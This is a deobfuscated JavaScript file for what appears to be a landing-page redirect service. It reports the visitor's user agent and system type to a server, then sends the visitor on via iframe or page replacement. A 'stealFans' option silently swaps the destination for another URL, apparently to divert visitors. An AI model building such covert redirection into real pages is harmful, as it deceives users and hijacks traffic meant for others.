//Tue Sep 02 2025 03:25:30 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
preAccessPlus();
async function preAccessPlus() {
  const _0x14aa2e = await fetch(location.origin + "/api/chashe/accessRecord/preAccessPlus", {
    "method": "POST",
    "headers": {
      "Content-Type": "application/json; charset=UTF-8"
    },
    "body": JSON.stringify({
      "domain": location.hostname,
      "systemType": getSystemType(),
      "userAgent": navigator.userAgent
    })
  });
  const _0x445c02 = await _0x14aa2e.json();
  if (_0x445c02.success) {
    const _0x3af447 = _0x445c02.data;
    document.title = _0x3af447.title || "";
    const _0x5374ff = document.getElementsByClassName("subtitle")[0];
    const _0x941ad0 = document.getElementsByClassName("qr-code")[0];
    const _0x143843 = document.getElementsByClassName("iframe")[0];
    _0x5374ff.innerText = _0x3af447.subtitle || "";
    if (_0x3af447.backgroundImagePath) {
      const _0x2592ce = document.createElement("img");
      _0x2592ce.className = "img";
      _0x2592ce.src = getAccessUrl(_0x3af447.backgroundImagePath);
      _0x2592ce.style.width = "100%";
      _0x5374ff.style.display = "block";
      _0x941ad0.style.display = "block";
      _0x941ad0.appendChild(_0x2592ce);
    } else if (_0x3af447.jumpUrl) {
      if (_0x3af447.useIframe) {
        _0x5374ff.style.display = "none";
        _0x941ad0.style.display = "none";
        _0x143843.src = _0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl;
        _0x143843.style.display = "block";
      } else {
        location.replace(_0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl);
      }
    }
    if ([1, 3].includes(_0x3af447.jumpType) && _0x3af447.jumpUrl) {
      document.getElementsByClassName("img")[0].addEventListener("touchstart", function (_0x2f422f) {
        _0x2f422f.preventDefault();
        if (_0x3af447.useIframe) {
          _0x5374ff.style.display = "none";
          _0x941ad0.style.display = "none";
          _0x143843.src = _0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl;
          _0x143843.style.display = "block";
        } else {
          location.replace(_0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl);
        }
      });
    }
    if ([2, 3].includes(_0x3af447.jumpType) && _0x3af447.jumpUrl) {
      setTimeout(() => {
        if (_0x3af447.useIframe) {
          _0x5374ff.style.display = "none";
          _0x941ad0.style.display = "none";
          _0x143843.src = _0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl;
          _0x143843.style.display = "block";
        } else {
          location.replace(_0x3af447.stealFans ? _0x3af447.stealFansJumpUrl : _0x3af447.jumpUrl);
        }
      }, (_0x3af447.stealFans ? _0x3af447.stealFansJumpTime : _0x3af447.jumpTime) * 1000);
    }
  } else {
    document.write("<div style=\"text-align: center;\">" + _0x445c02.message + "</div>");
  }
}
function getSystemType() {
  const _0xf4acb3 = navigator.userAgent;
  if (/android/i.test(_0xf4acb3)) {
    return "Android";
  }
  if (/iPhone|iPad|iPod/i.test(_0xf4acb3) && !window.MSStream) {
    return "iOS";
  }
  if (/Harmony/i.test(_0xf4acb3)) {
    return "Harmony";
  }
  if (/windows phone/i.test(_0xf4acb3)) {
    return "Windows Phone";
  }
  if (/win/i.test(_0xf4acb3)) {
    return "Windows";
  }
  if (/macintosh|mac os x/i.test(_0xf4acb3)) {
    return "Mac";
  }
  if (/linux/i.test(_0xf4acb3)) {
    return "Linux";
  }
  if (/bingbot/i.test(_0xf4acb3)) {
    return "必应爬虫";
  }
  return "未知";
}
function getAccessUrl(_0x44c747) {
  if (!_0x44c747) {
    return null;
  }
  if (_0x44c747.startsWith("http")) {
    return _0x44c747;
  }
  return "//" + location.hostname + _0x44c747;
}
_0xodm = "jsjiami.com.v6";